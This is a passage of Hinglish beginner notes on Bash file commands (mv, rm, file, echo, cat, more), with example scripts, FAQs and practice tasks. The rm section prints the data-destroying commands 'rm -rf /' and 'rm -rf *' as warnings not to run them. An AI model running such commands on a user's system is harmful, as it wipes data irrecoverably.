### 7. **Example 1 (Basic)**

```bash
# Rename karna
$ mv report.txt final_report.txt
$ ls
final_report.txt

# Move karna
$ mv final_report.txt documents/
$ ls documents/
final_report.txt

# Folder rename
$ mv old_project new_project
$ ls
new_project/
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Downloads folder ko organize karna

DOWNLOADS="$HOME/Downloads"
DOCS="$HOME/Documents"
PICS="$HOME/Pictures"
VIDEOS="$HOME/Videos"

echo "Organizing downloads..."

# Documents move
mv -v "$DOWNLOADS"/*.{pdf,doc,docx,txt} "$DOCS/" 2>/dev/null

# Pictures move
mv -v "$DOWNLOADS"/*.{jpg,jpeg,png,gif} "$PICS/" 2>/dev/null

# Videos move
mv -v "$DOWNLOADS"/*.{mp4,avi,mkv} "$VIDEOS/" 2>/dev/null

echo "Organization complete!"
```

**Output:**
```
Organizing downloads...
'Downloads/report.pdf' -> 'Documents/report.pdf'
'Downloads/photo.jpg' -> 'Pictures/photo.jpg'
'Downloads/video.mp4' -> 'Videos/video.mp4'
Organization complete!
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`cp` aur `mv` confuse karna:** `cp` copy karta hai (original rahta hai), `mv` move karta hai (original hat jaata hai)
- ❌ **Destination path galat:** Agar destination folder exist nahi karta, file us naam se rename ho jayegi
- ❌ **Overwrite warning ignore:** Bina `-i` ke important files overwrite ho sakti hain

### 10. **Best Practices / Pro Tips**
- 💡 **Rename ke liye same folder mein:** `mv old.txt new.txt` - simple aur safe
- 💡 **Hamesha `-i` use karo:** Important files ke liye safety
- 💡 **Wildcards ka power:** `mv *.log logs/` - saari log files ek saath
- 💡 **Folders ke liye `-r` nahi chahiye:** `cp` se alag, `mv` automatically recursive hai

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek photographer hain aur aapko photos ko date-wise folders mein organize karna hai:

```bash
#!/bin/bash
# Photos ko date-wise organize karna

for file in *.jpg; do
    # File ka modification date nikalo
    DATE=$(stat -c %y "$file" | cut -d' ' -f1)
    
    # Date folder banao
    mkdir -p "$DATE"
    
    # Photo move karo
    mv -v "$file" "$DATE/"
done

echo "All photos organized by date!"
```

Yeh script saari photos ko automatically date-wise folders mein organize kar dega.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `mv old new` - Rename karna
- ✅ `mv file folder/` - Move karna
- ✅ `mv -i` - Overwrite se pehle confirm
- ✅ `mv -v` - Progress dekhna
- ✅ Folders ke liye `-r` nahi chahiye

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `mv` aur `cp` mein kya main fark hai?**
A: `cp` copy banata hai (original + copy dono rahte hain), `mv` move karta hai (sirf ek location par rahta hai).

**Q2: Kya `mv` se undo ho sakta hai?**
A: Nahi directly. Isliye important files ke liye pehle backup lo ya `-i` option use karo.

**Q3: Agar destination file already exist karti hai?**
A: By default overwrite ho jayegi. `-i` use karo confirmation ke liye, ya `-n` use karo overwrite prevent karne ke liye.

### 14. **Practice ke liye Task**

```bash
# 1. Test files banao
touch test1.txt test2.txt test3.txt

# 2. Rename practice
mv test1.txt renamed_test1.txt

# 3. Folder banao aur files move karo
mkdir test_folder
mv test2.txt test3.txt test_folder/

# 4. Folder rename
mv test_folder renamed_folder

# 5. Verify karo
ls
ls renamed_folder/
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔄 `mv` move aur rename dono karta hai
- 📦 Original file hat jaati hai (copy nahi banti)
- 📁 Folders ke liye `-r` option nahi chahiye
- 🛡️ `-i` option se accidental overwrite se bacho
- ⚡ Wildcards se multiple files ek saath move karo

> **💡 Ye Zaroor Yaad Rakhein:**
> `mv` permanent operation hai - file original location se hat jaati hai. Important files ke liye pehle backup lo ya `-i` option use karo!

---

## **Topic 7: Deleting Files & Folders (`rm`, `rm -r`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Deleting Files & Folders** - Files aur folders ko permanently delete karna.

### 2. **Ye Kya Hai? (What is it?)**
`rm` command (remove ka short form) files aur folders ko permanently delete kar deta hai. Windows ki tarah Recycle Bin nahi hai - ek baar delete kiya toh wapas nahi aa sakta (normally).

**Analogy:** Socho ki aap paper shredder use kar rahe hain. Ek baar document shred ho gaya toh wapas nahi jod sakte. `rm` bhi waise hi permanent hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Disk space free karna** - Unnecessary files hatana
- ✅ **Cleanup** - Temporary aur junk files delete karna
- ✅ **Security** - Sensitive files permanently remove karna
- ✅ **Automation** - Scripts mein old files auto-delete karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab files permanently delete karni hon
- Disk space kam ho aur cleanup chahiye
- Temporary files ya cache clear karna ho
- Old log files ya backups delete karni hon

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Disk space waste hoga
- System slow ho sakta hai (bahut saari files se)
- Sensitive data leak ho sakta hai
- **DANGER:** Galat command se important data permanently delete ho sakta hai!

### 6. **Syntax aur Common Options**

```bash
# File delete
rm filename.txt

# Multiple files
rm file1.txt file2.txt file3.txt

# Interactive mode (RECOMMENDED!)
rm -i filename.txt

# Folder delete (recursive)
rm -r foldername

# Force delete (dangerous!)
rm -rf foldername

# Verbose mode
rm -v filename.txt

# Wildcards se delete
rm *.tmp
```

**Important Options:**
- `-i` : Interactive (har file ke liye confirm) - SAFEST!
- `-r` : Recursive (folders ke liye zaroori)
- `-f` : Force (bina confirm, bina error) - DANGEROUS!
- `-v` : Verbose (kya delete ho raha hai dikhao)

**⚠️ DANGER ZONE:**
- `rm -rf /` - KABHI MAT CHALAO! Poora system delete ho jayega!
- `rm -rf *` - Current folder ki sab kuch delete - bahut careful!

### 7. **Example 1 (Basic)**

```bash
# Single file delete
$ rm test.txt

# Interactive delete (safe)
$ rm -i important.txt
rm: remove regular file 'important.txt'? y

# Folder delete
$ rm -r old_folder

# Multiple files with wildcard
$ rm *.log
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Old log files cleanup (7 days se purani)

LOG_DIR="/var/log/myapp"
DAYS=7

echo "Cleaning up logs older than $DAYS days..."

# Find aur delete
find "$LOG_DIR" -name "*.log" -type f -mtime +$DAYS -exec rm -v {} \;

# Summary
REMAINING=$(ls -1 "$LOG_DIR"/*.log 2>/dev/null | wc -l)
echo "Cleanup complete! $REMAINING log files remaining."
```

**Output:**
```
Cleaning up logs older than 7 days...
removed '/var/log/myapp/old_app.log'
removed '/var/log/myapp/error_20240101.log'
Cleanup complete! 5 log files remaining.
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`rm -rf` blindly use karna:** Bahut dangerous! Galat path diya toh disaster
- ❌ **Backup bina delete karna:** Important files ka backup pehle lo
- ❌ **Root directory mein `rm *`:** Current directory check karo pehle!
- ❌ **`-i` option nahi use karna:** Accidental deletion ka risk

### 10. **Best Practices / Pro Tips**
- 💡 **HAMESHA `-i` use karo:** Especially important files ke liye
- 💡 **Pehle `ls` se verify karo:** `ls *.log` dekho, phir `rm *.log` karo
- 💡 **Alias banao:** `alias rm='rm -i'` - automatic safety
- 💡 **Trash script use karo:** Files ko trash folder mein move karo instead of direct delete
- 💡 **`pwd` check karo:** Delete karne se pehle confirm karo ki sahi folder mein hain

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek sysadmin hain aur server par disk space khatam ho raha hai. Aapko old backup files delete karni hain:

```bash
#!/bin/bash
# Safe backup cleanup script

BACKUP_DIR="/backups"
DAYS_TO_KEEP=30

echo "Current disk usage:"
df -h "$BACKUP_DIR"

echo -e "\nFinding backups older than $DAYS_TO_KEEP days..."
find "$BACKUP_DIR" -name "backup_*.tar.gz" -mtime +$DAYS_TO_KEEP -ls

read -p "Delete these files? (yes/no): " CONFIRM

if [ "$CONFIRM" = "yes" ]; then
    find "$BACKUP_DIR" -name "backup_*.tar.gz" -mtime +$DAYS_TO_KEEP -delete
    echo "Cleanup complete!"
else
    echo "Cleanup cancelled."
fi

echo -e "\nNew disk usage:"
df -h "$BACKUP_DIR"
```

Yeh script safe hai kyunki pehle files dikhata hai, phir user se confirm karta hai.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `rm file` - File delete karna
- ✅ `rm -i` - Interactive mode (SAFEST)
- ✅ `rm -r folder` - Folder delete karna
- ✅ `rm -v` - Verbose (kya delete ho raha hai dekho)
- ⚠️ `rm -rf` - BAHUT CAREFUL! Permanent aur forceful

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Kya deleted files wapas aa sakti hain?**
A: Normally nahi. Linux mein Recycle Bin nahi hai. Special recovery tools se kabhi-kabhi recover ho sakti hain, but guaranteed nahi.

**Q2: `rm -rf` itna dangerous kyun hai?**
A: Kyunki yeh bina kisi warning ke, forcefully, recursively sab kuch delete kar deta hai. Ek galat path aur important data gone!

**Q3: Kya main safer alternative use kar sakta hoon?**
A: Haan! `trash-cli` install karo ya ek script banao jo files ko `.trash` folder mein move kare instead of direct delete.

### 14. **Practice ke liye Task**

```bash
# 1. Test environment banao
mkdir delete_practice
cd delete_practice
touch file1.txt file2.txt file3.txt
mkdir folder1 folder2

# 2. Interactive delete practice
rm -i file1.txt

# 3. Multiple files
rm file2.txt file3.txt

# 4. Folder delete
rm -r folder1

# 5. Verbose delete
mkdir test_folder
touch test_folder/test.txt
rm -rv test_folder

# 6. Cleanup
cd ..
rm -r delete_practice
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🗑️ `rm` permanently delete karta hai (no undo!)
- 🛡️ `-i` option HAMESHA use karo important files ke liye
- 📁 `-r` folders ke liye zaroori hai
- ⚠️ `-rf` combination bahut dangerous - careful!
- ✅ Pehle `ls` se verify, phir `rm` karo

> **💡 Ye Zaroor Yaad Rakhein:**
> `rm` command mein koi "Undo" button nahi hai! HAMESHA double-check karo kya delete kar rahe hain. Important files ka backup pehle lo. Jab doubt ho, `-i` option use karo!

---

## **Topic 8: File Type & Help (`file` command, `command --help`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**File Type & Help** - File ka type pata karna aur commands ki help dekhna.

### 2. **Ye Kya Hai? (What is it?)**
`file` command batata hai ki koi file kis type ki hai (text, image, executable, etc.). `--help` option har command ke usage aur options ki jaankari deta hai.

**Analogy:** `file` command ek detective hai jo file ko dekh kar batata hai ki yeh kya hai. `--help` ek instruction manual hai jo command kaise use karna hai batata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **File type identify karna** - Extension se dhoka ho sakta hai
- ✅ **Security** - Malicious files detect karna
- ✅ **Command learning** - Naye commands seekhna
- ✅ **Troubleshooting** - Options aur syntax samajhna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab file ka extension missing ho ya wrong ho
- Jab suspicious file check karni ho
- Jab naya command seekh rahe ho
- Jab command ka syntax yaad nahi aa raha

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Galat program se file open karoge
- Malicious files execute ho sakti hain
- Commands galat use karoge
- Time waste hoga trial-and-error mein

### 6. **Syntax aur Common Options**

```bash
# File type check karna
file filename

# Multiple files
file file1 file2 file3

# Brief output
file -b filename

# MIME type
file -i filename

# Command help
command --help

# Man pages (detailed help)
man command
```

**Important Options:**
- `file` - File type batata hai
- `file -b` - Brief (sirf type, filename nahi)
- `file -i` - MIME type (web-friendly format)
- `--help` - Quick reference
- `man` - Detailed manual

### 7. **Example 1 (Basic)**

```bash
# Text file
$ file notes.txt
notes.txt: ASCII text

# Image file
$ file photo.jpg
photo.jpg: JPEG image data, JFIF standard

# Script file
$ file script.sh
script.sh: Bash script, ASCII text executable

# Binary file
$ file /bin/ls
/bin/ls: ELF 64-bit LSB executable

# Command help
$ ls --help
Usage: ls [OPTION]... [FILE]...
List information about the FILEs...
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File type analyzer script

echo "=== File Type Analyzer ==="

for item in *; do
    if [ -f "$item" ]; then
        TYPE=$(file -b "$item")
        SIZE=$(du -h "$item" | cut -f1)
        echo "📄 $item"
        echo "   Type: $TYPE"
        echo "   Size: $SIZE"
        echo ""
    fi
done
```

**Output:**
```
=== File Type Analyzer ===
📄 document.pdf
   Type: PDF document, version 1.4
   Size: 2.3M

📄 script.sh
   Type: Bash script, ASCII text executable
   Size: 4.0K

📄 image.png
   Type: PNG image data, 1920 x 1080
   Size: 856K
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Extension par bharosa karna:** `virus.txt` actually executable ho sakti hai
- ❌ **`--help` ignore karna:** Seedha Google par jaana instead of quick help check karna
- ❌ **`man` pages nahi padhna:** Bahut detailed info hoti hai wahan

### 10. **Best Practices / Pro Tips**
- 💡 **Suspicious files check karo:** Download ke baad `file` command use karo
- 💡 **`--help` pehle, Google baad mein:** Quick reference ke liye
- 💡 **`man` pages bookmark karo:** Important commands ke liye
- 💡 **`file -i` web development mein:** MIME types ke liye useful

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek security analyst hain aur aapko email attachment check karni hai:

```bash
#!/bin/bash
# Email attachment security checker

ATTACHMENT="$1"

if [ -z "$ATTACHMENT" ]; then
    echo "Usage: $0 <filename>"
    exit 1
fi

echo "Analyzing: $ATTACHMENT"
echo "========================"

# File type
TYPE=$(file -b "$ATTACHMENT")
echo "File Type: $TYPE"

# MIME type
MIME=$(file -bi "$ATTACHMENT")
echo "MIME Type: $MIME"

# Check for executables
if echo "$TYPE" | grep -qi "executable"; then
    echo "⚠️  WARNING: This is an executable file!"
    echo "   Do not run unless you trust the source."
elif echo "$TYPE" | grep -qi "script"; then
    echo "⚠️  WARNING: This is a script file!"
    echo "   Review contents before executing."
else
    echo "✅ File appears to be safe (not executable)"
fi
```

Yeh script email attachments ko analyze karke warn karta hai agar suspicious hai.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `file filename` - File type check karo
- ✅ `file -b` - Brief output (clean)
- ✅ `file -i` - MIME type (web-friendly)
- ✅ `command --help` - Quick help
- ✅ `man command` - Detailed manual

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `file` command kaise pata lagata hai file type?**
A: Yeh file ke content ko analyze karta hai, extension ko nahi. File ke starting bytes (magic numbers) check karta hai.

**Q2: `--help` aur `man` mein kya fark hai?**
A: `--help` quick reference hai (1-2 pages), `man` detailed manual hai (kai pages) with examples aur explanations.

**Q3: Kya har command mein `--help` option hota hai?**
A: Almost har modern command mein hota hai. Kuch purane commands mein `-h` ya `--help` dono kaam karte hain.

### 14. **Practice ke liye Task**

```bash
# 1. Different file types banao
echo "Hello" > test.txt
cp /bin/ls test_binary
wget https://via.placeholder.com/150 -O test.jpg

# 2. File types check karo
file test.txt
file test_binary
file test.jpg

# 3. Brief output
file -b test.txt

# 4. MIME types
file -i test.jpg

# 5. Command help explore karo
ls --help
cp --help
rm --help

# 6. Man page dekho
man ls
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔍 `file` command file ka actual type batata hai (extension se independent)
- 📋 `file -b` clean output deta hai
- 🌐 `file -i` MIME type deta hai (web development ke liye)
- 📖 `--help` quick reference, `man` detailed manual
- 🛡️ Security ke liye suspicious files check karo

> **💡 Ye Zaroor Yaad Rakhein:**
> File extension par kabhi bharosa mat karo! `file` command use karke actual type check karo. Aur jab bhi naya command use karo, pehle `--help` dekho!

---

# **🎉 Module 1 Complete! 🎉**

Congratulations! Aapne **Module 1: Basic Navigation & File Handling** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ Terminal mein navigate karna (`pwd`, `cd`, `cd ..`, `cd -`)
✅ Files aur folders list karna (`ls`, `ls -a`, `ls -l`)
✅ Terminal control (`clear`, `reset`)
✅ Files aur folders banana (`touch`, `mkdir`, `mkdir -p`)
✅ Files copy karna (`cp`, `cp -r`, `cp -v`)
✅ Files move aur rename karna (`mv`)
✅ Files delete karna (`rm`, `rm -r`, `rm -i`)
✅ File types check karna aur help lena (`file`, `--help`)

## **Next Steps:**
Ab aap ready hain **Module 2: Viewing & Printing Text** ke liye!

---

**📝 Practice Reminder:**
Yeh saare commands daily practice karo. Muscle memory banana bahut zaroori hai. Ek test folder banao aur in sabhi commands ko try karo bina kisi dar ke!

---
=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 2)**

---

## **PART 1: THE ABSOLUTE BASICS (Shuruaat)**

---

# **Module 2: Viewing & Printing Text**

---

## **Topic 1: `echo` Command (`echo`, `echo -e` with `\n` and `\t`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**echo Command** - Terminal par text print karna aur display karna.

### 2. **Ye Kya Hai? (What is it?)**
`echo` command terminal par text print karta hai. Yeh programming languages ke `print()` function jaisa hai. Scripts mein messages dikhane, variables ki values print karne, aur output generate karne ke liye use hota hai.

**Analogy:** Socho ki `echo` ek loudspeaker hai jo aapki baat ko sabko sunata hai. Jo bhi aap echo ko doge, woh terminal par dikha dega.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **User ko messages dikhana** - Scripts mein progress aur status batana
- ✅ **Debugging** - Variables ki values check karna
- ✅ **Output generation** - Files mein content likhna
- ✅ **Interactive scripts** - User ko instructions dena

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Scripts mein user ko kuch batana ho
- Variables ki values dekhni hon
- Files mein text likhna ho (redirection ke saath)
- Formatted output chahiye (newlines, tabs)

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Scripts silent rahenge, user ko pata nahi chalega kya ho raha hai
- Debugging mushkil ho jayegi
- Interactive scripts nahi bana paoge
- Professional output nahi de paoge

### 6. **Syntax aur Common Options**

```bash
# Basic echo
echo "Hello World"

# Without quotes (simple text)
echo Hello World

# With variables
echo "Value is: $variable"

# Enable escape sequences
echo -e "Line1\nLine2"

# No trailing newline
echo -n "Text without newline"

# Escape sequences with -e
echo -e "Tab\there"
echo -e "New\nLine"
```

**Important Options:**
- `-e` : Enable interpretation of backslash escapes
- `-n` : No trailing newline
- `\n` : New line
- `\t` : Tab
- `\b` : Backspace

### 7. **Example 1 (Basic)**

```bash
$ echo "Hello World"
Hello World

$ echo Hello World
Hello World

$ name="Satish"
$ echo "My name is $name"
My name is Satish

$ echo -e "Line 1\nLine 2"
Line 1
Line 2

$ echo -e "Name:\tSatish"
Name:	Satish
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System info display script

echo "================================"
echo "   SYSTEM INFORMATION"
echo "================================"
echo ""
echo -e "Hostname:\t$(hostname)"
echo -e "Username:\t$(whoami)"
echo -e "Date:\t\t$(date +%Y-%m-%d)"
echo -e "Uptime:\t\t$(uptime -p)"
echo ""
echo "================================"
```

**Output:**
```
================================
   SYSTEM INFORMATION
================================

Hostname:	myserver
Username:	satish
Date:		2024-01-15
Uptime:		up 2 days, 5 hours

================================
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`-e` bhoolna:** `echo "Line1\nLine2"` literally `\n` print karega
- ❌ **Quotes nahi use karna:** Variables ke saath quotes zaroori hain
- ❌ **Single vs Double quotes:** Single quotes mein variables expand nahi hote

### 10. **Best Practices / Pro Tips**
- 💡 **Double quotes use karo:** Variables ke liye hamesha `"$var"`
- 💡 **`-e` yaad rakho:** Formatting ke liye zaroori
- 💡 **Colors add karo:** `echo -e "\e[32mGreen Text\e[0m"`
- 💡 **Redirection:** `echo "text" > file.txt` se files mein likho

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek backup script bana rahe hain jo user ko har step bataye:

```bash
#!/bin/bash
BACKUP_DIR="/backups"
DATE=$(date +%Y%m%d)

echo "Starting backup process..."
echo -e "\nBackup Directory: $BACKUP_DIR"
echo -e "Date: $DATE\n"

echo "Step 1: Creating backup folder..."
mkdir -p "$BACKUP_DIR/$DATE"

echo "Step 2: Copying files..."
cp -r /home/user/documents "$BACKUP_DIR/$DATE/"

echo -e "\n✅ Backup completed successfully!"
echo "Location: $BACKUP_DIR/$DATE"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `echo "text"` - Basic printing
- ✅ `echo -e` - Escape sequences enable karo
- ✅ `\n` - New line, `\t` - Tab
- ✅ `echo -n` - No newline at end
- ✅ Double quotes for variables

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Single aur Double quotes mein kya fark hai?**
A: Single quotes (`'`) mein variables expand nahi hote. Double quotes (`"`) mein variables ki values aa jaati hain.

**Q2: `echo` aur `printf` mein kya fark hai?**
A: `echo` simple hai, `printf` zyada powerful aur formatted output deta hai (C language jaisa).

**Q3: Colors kaise add karu?**
A: ANSI escape codes use karo: `echo -e "\e[31mRed\e[0m"` (31=red, 32=green, 0=reset)

### 14. **Practice ke liye Task**

```bash
# 1. Basic echo
echo "Hello Bash"

# 2. Variables ke saath
name="Your Name"
echo "Hello, $name"

# 3. Newlines
echo -e "Line 1\nLine 2\nLine 3"

# 4. Tabs
echo -e "Name:\tSatish\nAge:\t25"

# 5. File mein write
echo "This is a test" > test.txt
cat test.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📢 `echo` text print karta hai terminal par
- 🔤 `-e` option escape sequences enable karta hai
- 📝 `\n` new line, `\t` tab space deta hai
- 💬 Double quotes variables expand karte hain
- 📄 Redirection se files mein likh sakte hain

> **💡 Ye Zaroor Yaad Rakhein:**
> `echo` scripting ka sabse basic command hai. Hamesha double quotes use karo variables ke saath, aur `-e` flag yaad rakho formatting ke liye!

---

## **Topic 2: `cat` Command (Single file, multiple files, `cat -n`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**cat Command** - Files ka content terminal par dekhna aur concatenate karna.

### 2. **Ye Kya Hai? (What is it?)**
`cat` command (concatenate ka short form) files ka content terminal par display karta hai. Ek ya multiple files ko read kar sakta hai, aur unhe jod bhi sakta hai.

**Analogy:** Socho ki `cat` ek reader hai jo book (file) ko khol kar aapko padh kar sunata hai. Multiple books ko ek saath bhi padh sakta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Quick file viewing** - Bina editor khole content dekh sakte hain
- ✅ **File concatenation** - Multiple files ko jod sakte hain
- ✅ **Piping** - Output ko doosre commands ko bhej sakte hain
- ✅ **File creation** - Quick text files bana sakte hain

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Chhoti files ka content quickly dekhna ho
- Multiple files ko combine karna ho
- Log files check karni hon
- Configuration files padhni hon

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Har baar editor open karna padega (time waste)
- Multiple files compare nahi kar paoge
- Quick debugging mushkil hogi
- Piping aur redirection ka fayda nahi utha paoge

### 6. **Syntax aur Common Options**

```bash
# Single file
cat filename.txt

# Multiple files
cat file1.txt file2.txt

# With line numbers
cat -n filename.txt

# Show non-printing characters
cat -A filename.txt

# Squeeze blank lines
cat -s filename.txt

# Create file (Ctrl+D to save)
cat > newfile.txt

# Append to file
cat >> existingfile.txt
```

**Important Options:**
- `-n` : Line numbers show karo
- `-b` : Non-blank lines ko number karo
- `-s` : Multiple blank lines ko ek mein squeeze karo
- `-A` : All non-printing characters show karo

### 7. **Example 1 (Basic)**

```bash
# File content dekhna
$ cat notes.txt
This is line 1
This is line 2

# Line numbers ke saath
$ cat -n notes.txt
     1	This is line 1
     2	This is line 2

# Multiple files
$ cat file1.txt file2.txt
Content of file1
Content of file2
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Log analyzer script

LOG_FILE="/var/log/app.log"
ERROR_FILE="/tmp/errors.txt"

echo "Analyzing logs..."

# Errors extract karo
cat "$LOG_FILE" | grep -i "error" > "$ERROR_FILE"

# Line numbers ke saath dikhaao
echo "=== Errors Found ==="
cat -n "$ERROR_FILE"

# Summary
ERROR_COUNT=$(cat "$ERROR_FILE" | wc -l)
echo -e "\nTotal Errors: $ERROR_COUNT"
```

**Output:**
```
Analyzing logs...
=== Errors Found ===
     1	[ERROR] Connection failed
     2	[ERROR] Timeout occurred
     3	[ERROR] Invalid input

Total Errors: 3
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Badi files par `cat` use karna:** Screen flood ho jayegi, `less` ya `more` use karo
- ❌ **Binary files par `cat`:** Terminal ka output kharab ho jayega
- ❌ **`cat` ko useless use karna:** `cat file.txt | grep word` ki jagah `grep word file.txt` better hai

### 10. **Best Practices / Pro Tips**
- 💡 **Chhoti files ke liye:** `cat` perfect hai
- 💡 **Badi files ke liye:** `less` ya `head`/`tail` use karo
- 💡 **Quick file creation:** `cat > file.txt` type karo, content likho, Ctrl+D dabao
- 💡 **Useless cat avoid karo:** Direct command use karo jahan possible ho

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek developer hain aur multiple config files ko ek master config mein merge karna hai:

```bash
#!/bin/bash
# Config files merge karna

MASTER_CONFIG="master.conf"

echo "# Master Configuration File" > "$MASTER_CONFIG"
echo "# Generated on $(date)" >> "$MASTER_CONFIG"
echo "" >> "$MASTER_CONFIG"

# All config files merge karo
cat database.conf >> "$MASTER_CONFIG"
echo "" >> "$MASTER_CONFIG"
cat server.conf >> "$MASTER_CONFIG"
echo "" >> "$MASTER_CONFIG"
cat security.conf >> "$MASTER_CONFIG"

echo "Master config created!"
cat -n "$MASTER_CONFIG"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `cat file` - File content dekhna
- ✅ `cat file1 file2` - Multiple files concatenate
- ✅ `cat -n` - Line numbers ke saath
- ✅ `cat > file` - Nayi file banana
- ✅ `cat >> file` - Existing file mein append

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `cat` aur `less` mein kya fark hai?**
A: `cat` poora content ek saath dikha deta hai. `less` page-by-page dikhata hai, scroll kar sakte hain.

**Q2: Binary files par `cat` use karne se kya hota hai?**
A: Terminal ka output garbled ho jayega. `file` command se pehle check karo.

**Q3: `cat` se file kaise banau?**
A: `cat > filename.txt` type karo, content likho, Ctrl+D dabao save karne ke liye.

### 14. **Practice ke liye Task**

```bash
# 1. Test file banao
echo -e "Line 1\nLine 2\nLine 3" > test1.txt
echo -e "Line A\nLine B" > test2.txt

# 2. Content dekho
cat test1.txt

# 3. Line numbers ke saath
cat -n test1.txt

# 4. Multiple files
cat test1.txt test2.txt

# 5. Merge karo
cat test1.txt test2.txt > merged.txt
cat merged.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📖 `cat` files ka content quickly dikhata hai
- 🔢 `-n` option line numbers add karta hai
- 🔗 Multiple files ko concatenate kar sakta hai
- ✍️ `cat >` se nayi files bana sakte hain
- ⚠️ Badi files ke liye `less` better hai

> **💡 Ye Zaroor Yaad Rakhein:**
> `cat` chhoti files ke liye perfect hai. Badi files ke liye `less` use karo. "Useless use of cat" se bacho - direct commands prefer karo!

---

## **Topic 3: `more` Command (Viewing long files)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**more Command** - Lambi files ko page-by-page dekhna.

### 2. **Ye Kya Hai? (What is it?)**
`more` command badi files ko ek screen (page) ke hisaab se dikhata hai. Aap space bar dabake aage badh sakte hain. Yeh `cat` se better hai jab file bahut lambi ho.

**Analogy:** Socho ki aap ek moti book padh rahe hain. `more` ek page dikhata hai, aap padhte hain, phir next page par jaate hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Badi files handle karna** - Screen flood nahi hogi
- ✅ **Controlled viewing** - Apni speed se padh sakte hain
- ✅ **Log files** - Lambi log files check karne ke liye
- ✅ **Documentation** - README files padhne ke liye

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab file itni lambi ho ki screen par fit na ho
- Log files review karni hon
- Documentation padhni ho
- Step-by-step content dekhna ho

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- `cat` se screen flood ho jayegi
- Important content scroll karke upar chala jayega
- Badi files padhna mushkil hoga
- Terminal hang lag sakta hai

### 6. **Syntax aur Common Options**

```bash
# Basic usage
more filename.txt

# Start from line number
more +10 filename.txt

# Multiple files
more file1.txt file2.txt

# With piping
command | more
```

**Navigation Keys:**
- `Space` : Next page
- `Enter` : Next line
- `q` : Quit
- `b` : Previous page (kuch systems mein)
- `/pattern` : Search for pattern

### 7. **Example 1 (Basic)**

```bash
# Lambi file dekhna
$ more /var/log/syslog
[Content shows page by page]
--More--(45%)

# Line 20 se shuru karo
$ more +20 largefile.txt

# Command output ko page karo
$ ls -la /usr/bin | more
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System report generator

REPORT="/tmp/system_report.txt"

echo "Generating system report..."

{
    echo "=== SYSTEM REPORT ==="
    echo "Generated: $(date)"
    echo ""
    echo "=== DISK USAGE ==="
    df -h
    echo ""
    echo "=== MEMORY INFO ==="
    free -h
    echo ""
    echo "=== RUNNING PROCESSES ==="
    ps aux
} > "$REPORT"

echo "Report generated. Viewing..."
more "$REPORT"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`more` vs `less` confuse karna:** `less` zyada powerful hai
- ❌ **Chhoti files par use karna:** `cat` faster hai
- ❌ **Navigation keys nahi jaanna:** Space aur q yaad rakho

### 10. **Best Practices / Pro Tips**
- 💡 **`less` prefer karo:** Modern systems par `less` better hai
- 💡 **Piping ke saath:** Long command outputs ke liye useful
- 💡 **Search feature:** `/` dabake text search kar sakte hain
- 💡 **Quick exit:** `q` dabao turant exit karne ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap server par log file check kar rahe hain jo bahut badi hai:

```bash
# Apache access log dekhna (100MB+)
